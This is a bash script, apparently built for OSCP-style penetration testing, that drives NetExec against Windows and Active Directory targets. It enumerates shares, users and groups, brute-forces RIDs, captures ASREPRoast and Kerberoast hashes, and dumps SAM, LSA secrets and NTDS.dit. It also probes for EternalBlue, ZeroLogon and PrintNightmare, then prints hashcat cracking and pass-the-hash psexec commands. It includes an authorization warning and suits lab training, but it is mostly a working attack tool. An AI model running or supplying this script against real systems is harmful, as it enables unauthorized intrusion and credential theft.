#!/bin/bash

# =============================================================
#  Windows Enumeration Script — NetExec (nxc)
#  Usage: ./winenum.sh -t <target> [options]
# =============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# ---- Defaults ----
TARGET=""
USERNAME=""
PASSWORD=""
HASH=""
DOMAIN=""
OUTPUT_DIR=""
NULL_SESSION=false
SKIP_CONFIRM=false

banner() {
    echo -e "${CYAN}"
    echo "  ██╗    ██╗██╗███╗   ██╗███████╗███╗   ██╗██╗   ██╗███╗   ███╗"
    echo "  ██║    ██║██║████╗  ██║██╔════╝████╗  ██║██║   ██║████╗ ████║"
    echo "  ██║ █╗ ██║██║██╔██╗ ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║"
    echo "  ██║███╗██║██║██║╚██╗██║██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║"
    echo "  ╚███╔███╔╝██║██║ ╚████║███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║"
    echo "   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝"
    echo -e "  OSCP Windows Enumeration — NetExec Edition${NC}"
    echo ""
}

usage() {
    echo -e "${YELLOW}Usage:${NC} $0 -t <target> [options]"
    echo ""
    echo "  Required:"
    echo "    -t  <ip/range>   Target IP, range, or CIDR (e.g. 10.10.10.5 or 10.10.10.0/24)"
    echo ""
    echo "  Authentication (choose one):"
    echo "    -u  <username>   Username"
    echo "    -p  <password>   Password"
    echo "    -H  <NT hash>    Pass-the-hash (NT hash)"
    echo "    -d  <domain>     Domain name (optional, improves accuracy)"
    echo "    -n               Null/anonymous session (no creds)"
    echo ""
    echo "  Other:"
    echo "    -o  <dir>        Output directory (default: ./winenum_<target>)"
    echo "    -y               Skip confirmation prompt"
    echo "    -h               Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 -t 10.10.10.5 -n"
    echo "  $0 -t 10.10.10.5 -u administrator -p 'P@ssw0rd'"
    echo "  $0 -t 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:NTLMHASHHERE -d corp.local"
    exit 1
}

check_deps() {
    echo -e "${CYAN}[*] Checking dependencies...${NC}"
    local missing=0
    for cmd in nxc netexec; do
        if command -v "$cmd" &>/dev/null; then
            NXC_BIN="$cmd"
            echo -e "${GREEN}[+] Found: ${cmd}${NC}"
            missing=0
            break
        fi
        missing=1
    done
    if [ "$missing" -eq 1 ]; then
        echo -e "${RED}[-] 'netexec' (nxc) not found.${NC}"
        echo -e "    Install: pip3 install netexec  OR  apt install netexec"
        exit 1
    fi
}

build_auth() {
    AUTH_ARGS=()
    if [ "$NULL_SESSION" = true ]; then
        AUTH_ARGS+=("-u" "" "-p" "")
        echo -e "${YELLOW}[*] Using null/anonymous session${NC}"
    else
        [ -n "$USERNAME" ] && AUTH_ARGS+=("-u" "$USERNAME")
        [ -n "$PASSWORD" ] && AUTH_ARGS+=("-p" "$PASSWORD")
        [ -n "$HASH" ]     && AUTH_ARGS+=("-H" "$HASH")
        [ -n "$DOMAIN" ]   && AUTH_ARGS+=("-d" "$DOMAIN")
        if [ ${#AUTH_ARGS[@]} -eq 0 ]; then
            echo -e "${YELLOW}[!] No credentials provided — trying null session.${NC}"
            AUTH_ARGS+=("-u" "" "-p" "")
        fi
    fi
}

run_nxc() {
    local name="$1"
    local outfile="$2"
    shift 2
    local args=("$@")

    echo ""
    echo -e "${YELLOW}[*] ${name}${NC}"
    echo -e "    ${NXC_BIN} ${args[*]}"

    $NXC_BIN "${args[@]}" 2>/dev/null | tee "${outfile}.txt"

    local status=${PIPESTATUS[0]}
    if [ "$status" -eq 0 ]; then
        echo -e "${GREEN}[+] ${name} — done${NC}"
    else
        echo -e "${RED}[-] ${name} — error or no results${NC}"
    fi
}

section() {
    echo ""
    echo -e "${CYAN}======================================================${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}======================================================${NC}"
}

# ---- Parse args ----
while getopts "t:u:p:H:d:o:nyh" opt; do
    case "$opt" in
        t) TARGET="$OPTARG" ;;
        u) USERNAME="$OPTARG" ;;
        p) PASSWORD="$OPTARG" ;;
        H) HASH="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        n) NULL_SESSION=true ;;
        y) SKIP_CONFIRM=true ;;
        h) usage ;;
        *) usage ;;
    esac
done

[ -z "$TARGET" ] && usage

OUTPUT_DIR="${OUTPUT_DIR:-./winenum_$(echo "$TARGET" | tr '/' '_')}"

banner
check_deps

echo -e "${GREEN}[+] Target:     ${TARGET}${NC}"
echo -e "${GREEN}[+] Output dir: ${OUTPUT_DIR}${NC}"
[ -n "$USERNAME" ] && echo -e "${GREEN}[+] Username:   ${USERNAME}${NC}"
[ -n "$DOMAIN" ]   && echo -e "${GREEN}[+] Domain:     ${DOMAIN}${NC}"

if [ "$SKIP_CONFIRM" = false ]; then
    echo ""
    echo -e "${YELLOW}[!] Only use this script against systems you own or have explicit written permission to test.${NC}"
    echo -e "${YELLOW}    Unauthorized scanning is illegal.${NC}"
    echo ""
    read -rp "    Continue? [y/N] " confirm
    [[ "$confirm" =~ ^[Yy]$ ]] || exit 0
fi

mkdir -p "$OUTPUT_DIR"
LOG_FILE="${OUTPUT_DIR}/winenum.log"
exec > >(tee -a "$LOG_FILE") 2>&1

build_auth

echo -e "${GREEN}[+] Start time: $(date)${NC}"

# ============================================================
# STAGE 1 — Host reachability / SMB signing / OS fingerprint
# ============================================================
section "STAGE 1: Host Discovery & SMB Info"

run_nxc "SMB host info (OS, signing, hostname)" \
    "${OUTPUT_DIR}/01_smb_info" \
    smb "$TARGET"

# ============================================================
# STAGE 2 — Null / Anon session check
# ============================================================
section "STAGE 2: Null Session & Guest Access Check"

run_nxc "Null session check" \
    "${OUTPUT_DIR}/02_null_session" \
    smb "$TARGET" -u "" -p ""

run_nxc "Guest account check" \
    "${OUTPUT_DIR}/02_guest_session" \
    smb "$TARGET" -u "guest" -p ""

# ============================================================
# STAGE 3 — Authentication check
# ============================================================
section "STAGE 3: Authentication Validation"

run_nxc "Validate credentials" \
    "${OUTPUT_DIR}/03_auth_check" \
    smb "$TARGET" "${AUTH_ARGS[@]}"

# ============================================================
# STAGE 4 — SMB Shares
# ============================================================
section "STAGE 4: SMB Share Enumeration"

run_nxc "List SMB shares" \
    "${OUTPUT_DIR}/04_smb_shares" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --shares

run_nxc "Spider readable shares (depth 2)" \
    "${OUTPUT_DIR}/04_smb_spider" \
    smb "$TARGET" "${AUTH_ARGS[@]}" -M spider_plus \
    -o DOWNLOAD_FLAG=False MAX_DEPTH=2

# ============================================================
# STAGE 4b — Guest Account Share Enumeration
# ============================================================
section "STAGE 4b: Guest Account Share Enumeration"

run_nxc "List SMB shares as guest" \
    "${OUTPUT_DIR}/04b_guest_shares" \
    smb "$TARGET" -u "guest" -p "" --shares

run_nxc "Spider shares as guest (depth 2)" \
    "${OUTPUT_DIR}/04b_guest_spider" \
    smb "$TARGET" -u "guest" -p "" -M spider_plus \
    -o DOWNLOAD_FLAG=False MAX_DEPTH=2

run_nxc "List SMB shares as guest (local-auth)" \
    "${OUTPUT_DIR}/04b_guest_shares_local" \
    smb "$TARGET" -u "guest" -p "" --local-auth --shares

# ============================================================
# STAGE 5 — User Enumeration
# ============================================================
section "STAGE 5: User Enumeration"

run_nxc "Enumerate local users" \
    "${OUTPUT_DIR}/05_local_users" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --local-auth --users 2>/dev/null || \
run_nxc "Enumerate domain users" \
    "${OUTPUT_DIR}/05_users" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --users

run_nxc "Enumerate RID brute (500-1200)" \
    "${OUTPUT_DIR}/05_rid_brute" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --rid-brute 1200

# ============================================================
# STAGE 6 — Group Enumeration
# ============================================================
section "STAGE 6: Group Enumeration"

run_nxc "Enumerate local groups" \
    "${OUTPUT_DIR}/06_local_groups" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --local-groups

run_nxc "Enumerate domain groups" \
    "${OUTPUT_DIR}/06_groups" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --groups

# ============================================================
# STAGE 7 — Password Policy
# ============================================================
section "STAGE 7: Password Policy"

run_nxc "Dump password policy" \
    "${OUTPUT_DIR}/07_pass_policy" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --pass-pol

# ============================================================
# STAGE 8 — Logged-on & Sessions
# ============================================================
section "STAGE 8: Active Sessions & Logged-on Users"

run_nxc "Logged-on users" \
    "${OUTPUT_DIR}/08_loggedon" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --loggedon-users

run_nxc "Active sessions" \
    "${OUTPUT_DIR}/08_sessions" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --sessions

# ============================================================
# STAGE 9 — WINRM (if available)
# ============================================================
section "STAGE 9: WinRM Access Check"

run_nxc "WinRM auth check" \
    "${OUTPUT_DIR}/09_winrm" \
    winrm "$TARGET" "${AUTH_ARGS[@]}"

# ============================================================
# STAGE 10 — LDAP (domain targets)
# ============================================================
section "STAGE 10: LDAP / Active Directory Enumeration"

run_nxc "LDAP info + DC detection" \
    "${OUTPUT_DIR}/10_ldap_info" \
    ldap "$TARGET" "${AUTH_ARGS[@]}"

run_nxc "LDAP users" \
    "${OUTPUT_DIR}/10_ldap_users" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --users

run_nxc "LDAP groups" \
    "${OUTPUT_DIR}/10_ldap_groups" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --groups

run_nxc "LDAP password policy" \
    "${OUTPUT_DIR}/10_ldap_passpol" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --pass-pol

run_nxc "ASREPRoast check (no pre-auth users)" \
    "${OUTPUT_DIR}/10_asreproast" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --asreproast "${OUTPUT_DIR}/asrep_hashes.txt"

run_nxc "Kerberoastable accounts" \
    "${OUTPUT_DIR}/10_kerberoast" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" --kerberoasting "${OUTPUT_DIR}/kerberoast_hashes.txt"

run_nxc "MachineAccountQuota" \
    "${OUTPUT_DIR}/10_maq" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" -M maq

run_nxc "Find AD CS (certificate services)" \
    "${OUTPUT_DIR}/10_adcs" \
    ldap "$TARGET" "${AUTH_ARGS[@]}" -M adcs

# ============================================================
# STAGE 11 — MSSQL (if port 1433 is open)
# ============================================================
section "STAGE 11: MSSQL Enumeration"

run_nxc "MSSQL auth check" \
    "${OUTPUT_DIR}/11_mssql" \
    mssql "$TARGET" "${AUTH_ARGS[@]}"

run_nxc "MSSQL privilege check (xp_cmdshell, sysadmin)" \
    "${OUTPUT_DIR}/11_mssql_priv" \
    mssql "$TARGET" "${AUTH_ARGS[@]}" -M mssql_priv

# ============================================================
# STAGE 12 — Privilege / Local Admin Check
# ============================================================
section "STAGE 12: Local Admin & Privilege Checks"

run_nxc "Check local admin access" \
    "${OUTPUT_DIR}/12_local_admin" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --local-auth

run_nxc "SAM dump (requires admin)" \
    "${OUTPUT_DIR}/12_sam_dump" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --sam

run_nxc "LSA secrets dump (requires admin)" \
    "${OUTPUT_DIR}/12_lsa_dump" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --lsa

run_nxc "NTDS.dit dump — Domain Controller only (requires DA)" \
    "${OUTPUT_DIR}/12_ntds" \
    smb "$TARGET" "${AUTH_ARGS[@]}" --ntds 2>/dev/null

# ============================================================
# STAGE 13 — Useful Modules
# ============================================================
section "STAGE 13: Useful NSE-style Modules"

run_nxc "Check for MS17-010 (EternalBlue)" \
    "${OUTPUT_DIR}/13_ms17010" \
    smb "$TARGET" -M ms17-010

run_nxc "Check for ZeroLogon (CVE-2020-1472)" \
    "${OUTPUT_DIR}/13_zerologon" \
    smb "$TARGET" -M zerologon

run_nxc "Check for PrintNightmare (CVE-2021-1675)" \
    "${OUTPUT_DIR}/13_printnightmare" \
    smb "$TARGET" "${AUTH_ARGS[@]}" -M printnightmare

run_nxc "Enumerate installed software" \
    "${OUTPUT_DIR}/13_software" \
    smb "$TARGET" "${AUTH_ARGS[@]}" -M enum_av

run_nxc "Check for WebDAV" \
    "${OUTPUT_DIR}/13_webdav" \
    smb "$TARGET" "${AUTH_ARGS[@]}" -M webdav

# ============================================================
# Summary
# ============================================================
section "SUMMARY"

echo -e "${GREEN}[+] Target:      ${TARGET}${NC}"
echo -e "${GREEN}[+] Output dir:  ${OUTPUT_DIR}${NC}"
echo -e "${GREEN}[+] End time:    $(date)${NC}"
echo ""

# Quick wins — highlight anything that popped
echo -e "${MAGENTA}[*] Quick-win check — scanning output for wins...${NC}"

grep -rl "Pwn3d!" "$OUTPUT_DIR" 2>/dev/null | while read -r f; do
    echo -e "${RED}[!!!] LOCAL ADMIN ACCESS CONFIRMED: ${f}${NC}"
done

grep -rl "\[+\]" "$OUTPUT_DIR" 2>/dev/null | head -10 | while read -r f; do
    echo -e "${GREEN}[+] Positive result in: ${f}${NC}"
done

if [ -s "${OUTPUT_DIR}/asrep_hashes.txt" ]; then
    echo -e "${RED}[!!!] ASREPRoast hashes found: ${OUTPUT_DIR}/asrep_hashes.txt${NC}"
    echo -e "      Crack with: hashcat -m 18200 ${OUTPUT_DIR}/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
fi

if [ -s "${OUTPUT_DIR}/kerberoast_hashes.txt" ]; then
    echo -e "${RED}[!!!] Kerberoast hashes found: ${OUTPUT_DIR}/kerberoast_hashes.txt${NC}"
    echo -e "      Crack with: hashcat -m 13100 ${OUTPUT_DIR}/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt"
fi

# Guest share access quick-win check
if grep -ql "READ\|WRITE" "${OUTPUT_DIR}/04b_guest_shares.txt" 2>/dev/null; then
    echo -e "${RED}[!!!] Guest account has share READ/WRITE access: ${OUTPUT_DIR}/04b_guest_shares.txt${NC}"
fi

if grep -ql "READ\|WRITE" "${OUTPUT_DIR}/04b_guest_shares_local.txt" 2>/dev/null; then
    echo -e "${RED}[!!!] Guest account (local-auth) has share READ/WRITE access: ${OUTPUT_DIR}/04b_guest_shares_local.txt${NC}"
fi

echo ""
echo -e "${YELLOW}[*] Suggested next steps:${NC}"
echo "    - Review shares:    cat ${OUTPUT_DIR}/04_smb_shares.txt"
echo "    - Review guest shares: cat ${OUTPUT_DIR}/04b_guest_shares.txt"
echo "    - Review users:     cat ${OUTPUT_DIR}/05_users.txt"
echo "    - Evil-WinRM:       evil-winrm -i ${TARGET} -u <user> -p <pass>"
echo "    - Impacket PTH:     impacket-psexec <user>@${TARGET} -hashes :<NThash>"
echo "    - BloodHound ingest: bloodhound-python -u <user> -p <pass> -d <domain> -ns ${TARGET} -c all"
echo ""
echo -e "${GREEN}[+] All results saved to: ${OUTPUT_DIR}/${NC}"
